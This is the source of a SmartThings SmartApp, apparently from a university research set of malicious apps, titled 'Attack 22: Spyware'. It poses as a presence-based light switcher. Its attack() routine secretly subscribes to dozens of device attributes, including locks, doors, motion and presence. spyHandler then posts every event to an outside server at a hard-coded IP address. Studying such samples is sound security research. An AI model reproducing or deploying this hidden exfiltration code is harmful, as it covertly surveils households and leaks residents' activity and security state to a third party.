/**
 * Attack Description:
 * 		The malicious SmartApp spy on all events in the smart home and send to an attack server.
 * Normal functions:
 * 		Turn something on when you arrive and back off when you leave.
 * Malicious functions:
 * 		The normal function is still working. But all the events will be sent to a server.
 */
definition(
		name: "Attack 22: Spyware",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "Spy on all events in the home.",
		category: "Convenience",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Meta/light_presence-outlet.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Meta/light_presence-outlet@2x.png"
		)

preferences {
	section("When I arrive and leave..."){
		input "presence1", "capability.presenceSensor", title: "Who?", multiple: true
	}
	section("Turn on/off a light..."){
		input "switch1", "capability.switch", multiple: true
	}
}

def installed() {
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize(){
	subscribe(presence1, "presence", presenceHandler)
	attack()
}

def presenceHandler(evt) {
	def presenceValue = presence1.find{it.currentPresence == "present"}
	log.debug presenceValue
	if(presenceValue){
		switch1.on()
		log.debug "Someone's home!"
	}
	else{
		switch1.off()
		log.debug "Everyone's away."
	}
}

def attack(){
	def attributes = [
		"acceleration",
		"activities",
		"alarm",
		"battery",
		"button",
		"carbonMonoxide",
		"clip",
		"color",
		"colorTemperature",
		"contact",
		"coolingSetpoint",
		"currentActivity",
		"door",
		"energy",
		"goal",
		"heatingSetpoint",
		"hue",
		"humidity",
		"illuminance",
		"image",
		"level",
		"lock",
		"motion",
		"mute",
		"numberOfButtons",
		"power",
		"presence",
		"saturation",
		"schedule",
		"sleeping",
		"smoke",
		"status",
		"steps",
		"stream",
		"switch",
		"temperature",
		"thermostatFanMode",
		"thermostatMode",
		"thermostatOperatingState",
		"thermostatSetpoint",
		"threeAxis",
		"touch",
		"trackData",
		"trackDescription",
		"valve",
		"water",
		"windowShade"
	]
	settings.each{k,v->
		attributes.each{
			subscribe(v.id, it, spyHandler)
		}
	}
	subscribe(location, spyHandler)
}

def spyHandler(evt){
	def data = [name:evt.name, value:evt.value]
	try {
		httpPostJson("http://128.174.237.226:8080/ProvenanceServer/Attack", data)
	} catch (e) {
		log.debug "send spy information went wrong: $e"
	}
}